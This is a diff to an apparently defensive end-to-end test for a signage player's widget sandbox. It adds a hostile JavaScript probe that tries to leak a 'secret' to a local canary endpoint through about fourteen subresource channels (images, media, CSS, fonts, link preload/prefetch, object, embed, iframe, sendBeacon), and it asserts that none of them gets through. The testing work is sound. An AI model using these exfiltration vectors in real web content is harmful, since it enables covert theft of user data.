@@ -784,16 +784,59 @@ EVIL_PACKAGE = "acme.evil"
 EVIL_ID = "probe"
 
 
-def build_frame_document(bundle_name):
-    """The exact frame document production would serve for a fixture."""
+def build_frame_document(bundle_name, extra=""):
+    """The exact frame document production would serve for a fixture.
+
+    `extra` is appended to the bundle, for WPE-only probes that must not
+    change the shared fixture other hosts run."""
     tests_dir = os.path.dirname(os.path.abspath(__file__))
     root = os.path.normpath(os.path.join(tests_dir, "..", "..", "..", ".."))
     bundle = os.path.join(root, "packages", "player-contracts", "fixtures", "widget-package", bundle_name)
     helper = os.path.join(tests_dir, "build_frame_doc.py")
     with open(bundle, encoding="utf-8") as handle:
-        completed = subprocess.run([sys.executable, helper], stdin=handle, check=True,
-                                   capture_output=True, text=True)
+        source = handle.read() + extra
+    completed = subprocess.run([sys.executable, helper], input=source, check=True,
+                               capture_output=True, text=True)
     return completed.stdout.encode("utf-8")
+
+
+# Passive exfiltration on the real engine (the Browser Player proves the
+# same vectors on Chromium in apps/player-web/e2e/frames). connect-src
+# alone does not cover these: each subresource kind aims at the reachable
+# canary, outside the loopback /media/ route, so only the served frame
+# policy stands between the Widget and the canary's hit counter.
+PASSIVE_VECTORS = """
+(function (canary) {
+  "use strict";
+  function aim(name, attempt) {
+    try { attempt(canary + "/" + name + "?d=secret"); } catch (err) {}
+  }
+  function add(el) { (document.body || document.documentElement).appendChild(el); }
+  aim("img", function (u) { new Image().src = u; });
+  aim("srcset", function (u) { new Image().srcset = u + " 1x"; });
+  aim("video", function (u) { var v = document.createElement("video"); v.preload = "auto"; v.src = u; add(v); });
+  aim("audio", function (u) { var a = new Audio(); a.preload = "auto"; a.src = u; });
+  aim("poster", function (u) { var v = document.createElement("video"); v.poster = u; add(v); });
+  aim("css", function (u) {
+    var d = document.createElement("div");
+    d.style.cssText = "width:10px;height:10px;background-image:url(" + u + ")";
+    add(d);
+  });
+  aim("font", function (u) {
+    var s = document.createElement("style");
+    s.textContent = "@font-face{font-family:x;src:url(" + u + ")}.tcx{font-family:x}";
+    document.head.appendChild(s);
+    var d = document.createElement("span"); d.className = "tcx"; d.textContent = "x"; add(d);
+  });
+  aim("stylesheet", function (u) { var l = document.createElement("link"); l.rel = "stylesheet"; l.href = u; document.head.appendChild(l); });
+  aim("preload", function (u) { var l = document.createElement("link"); l.rel = "preload"; l.as = "image"; l.href = u; document.head.appendChild(l); });
+  aim("prefetch", function (u) { var l = document.createElement("link"); l.rel = "prefetch"; l.href = u; document.head.appendChild(l); });
+  aim("object", function (u) { var o = document.createElement("object"); o.data = u; add(o); });
+  aim("embed", function (u) { var e = document.createElement("embed"); e.src = u; add(e); });
+  aim("iframe", function (u) { var f = document.createElement("iframe"); f.src = u; add(f); });
+  aim("beacon", function (u) { navigator.sendBeacon(u, "secret"); });
+})(%s);
+"""
 
 
 def png_bytes():
@@ -817,9 +860,10 @@ class WidgetState:
     def __init__(self, installation, screen, server_url):
         self.installation = installation
         self.screen = screen
+        self.canary = f"{server_url}/api/v1/player/probe-exfil"
         self.frame = build_frame_document("bundle.js")
         self.frame_hex = hashlib.sha256(self.frame).hexdigest()
-        self.evil = build_frame_document("hostile.js")
+        self.evil = build_frame_document("hostile.js", PASSIVE_VECTORS % json.dumps(self.canary))
         self.evil_hex = hashlib.sha256(self.evil).hexdigest()
         self.package_hex = hashlib.sha256(b"acme-athletics-package").hexdigest()
         self.evil_package_hex = hashlib.sha256(b"acme-evil-package").hexdigest()
@@ -834,7 +878,6 @@ class WidgetState:
         self.layout_id = str(uuid.uuid4())
         self.item_full = str(uuid.uuid4())
         self.item_layout = str(uuid.uuid4())
-        self.canary = f"{server_url}/api/v1/player/probe-exfil"
         self.revision = 1
         self.tamper = False
         self.lock = threading.Lock()
@@ -843,6 +886,7 @@ class WidgetState:
         self.evil_requests = 0
         self.media_requests = 0
         self.exfil_hits = 0
+        self.exfil_paths = []
 
     @property
     def etag(self):
@@ -921,7 +965,7 @@ class WidgetState:
                 "id": self.layout_id, "revisionId": str(uuid.uuid4()), "revision": 1,
                 "documentSha256": hashlib.sha256(b"widget-layout").hexdigest(),
                 "document": {
-                    "schemaVersion": 1,
+                    "schemaVersion": 2,
                     "canvas": {"width": 1920, "height": 1080, "orientation": "landscape",
                                "backgroundColor": "#000000"},
                     "placements": [
@@ -985,7 +1029,22 @@ class WidgetHandler(http.server.BaseHTTPRequestHandler):
             body = bytes(flipped)
         self._send_bytes(body, "text/html")
 
+    def _exfil(self):
+        """Records a canary hit by any method; the hostile frame must never land one."""
+        if not self.path.startswith("/api/v1/player/probe-exfil"):
+            return False
+        with self.state.lock:
+            self.state.exfil_hits += 1
+            self.state.exfil_paths.append(f"{self.command} {self.path}")
+        length = int(self.headers.get("Content-Length", "0") or 0)
+        if length:
+            self.rfile.read(length)
+        self._send_json(200, {"data": {}})
+        return True
+
     def do_GET(self):  # noqa: N802
+        if self._exfil():
+            return None
         if self.path == "/api/v1/system/identity":
             return self._send_json(200, {"data": {
                 "product": "tilecast", "installationId": self.state.installation,
@@ -1025,13 +1084,8 @@ class WidgetHandler(http.server.BaseHTTPRequestHandler):
         return self._send_json(404, {"error": {"code": "not_found", "message": "no such path"}})
 
     def do_POST(self):  # noqa: N802
-        if self.path == "/api/v1/player/probe-exfil":
-            with self.state.lock:
-                self.state.exfil_hits += 1
-            length = int(self.headers.get("Content-Length", "0") or 0)
-            if length:
-                self.rfile.read(length)
-            return self._send_json(200, {"data": {}})
+        if self._exfil():
+            return None
         if not self._authorized():
             self._read_json()
             return self._deny()
@@ -1087,12 +1141,11 @@ def scenario_widget(args):
     with tempfile.TemporaryDirectory() as workdir:
         installation = str(uuid.uuid4())
         screen = str(uuid.uuid4())
-        # The handler needs the server URL for the exfil canary before the
-        # socket exists; re-point the state once the port is known.
+        # The socket is bound before serving starts, so the hostile frame can
+        # bake the reachable canary URL into its passive-vector probe.
         server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), WidgetHandler)
-        server.widget_state = WidgetState(installation, screen, "http://127.0.0.1:0")
         server_url = f"http://127.0.0.1:{server.server_address[1]}"
-        server.widget_state.canary = f"{server_url}/api/v1/player/probe-exfil"
+        server.widget_state = WidgetState(installation, screen, server_url)
         thread = threading.Thread(target=server.serve_forever, daemon=True)
         thread.start()
         stack = Stack(args, workdir)
@@ -1126,7 +1179,7 @@ def scenario_widget(args):
                 assert state.frame_requests > 0, "the scoreboard frame was never fetched"
                 assert state.evil_requests > 0, "the hostile frame was never fetched"
                 assert state.media_requests > 0, "the granted Widget media was never prepared"
-                assert state.exfil_hits == 0, "the hostile frame reached the network"
+                assert state.exfil_hits == 0, f"the hostile frame reached the network: {state.exfil_paths}"
                 beats = [b for b in state.heartbeats
                          if b.get("nativePresentationCapabilities", {}).get("widget.external-runtime") == 2]
                 assert beats, "no heartbeat advertised the frame execution ABI"
@@ -1141,8 +1194,14 @@ def scenario_widget(args):
             assert STREAM_CREDENTIAL not in renderer_log, "credential leaked to the renderer"
             assert STREAM_CREDENTIAL not in daemon_log, "credential leaked to the daemon log"
             assert state.frame.decode("utf-8").count(STREAM_CREDENTIAL) == 0
-            assert "content-security-policy" in renderer_log.lower() or "blocked" in renderer_log.lower(), \
-                "no console trace of the contained hostile fetch"
+            # The hostile fetch was attempted and contained: the probe only
+            # reports ready once its fetch settles, zone-probe rendered, and
+            # the canary saw no hit. (WebKit never writes page console
+            # messages for an ephemeral session, so the renderer log holds
+            # no CSP trace to look for.)
+            assert "zone-probe" in zones, "the hostile probe never settled its fetch"
+            with state.lock:
+                assert state.exfil_hits == 0, f"the hostile frame reached the network: {state.exfil_paths}"
             # The media socket refuses unknown capabilities with a bare
             # denial. (Retired-vs-unknown attribution is daemon-side and
             # covered by the registry unit test; this probe cannot pass
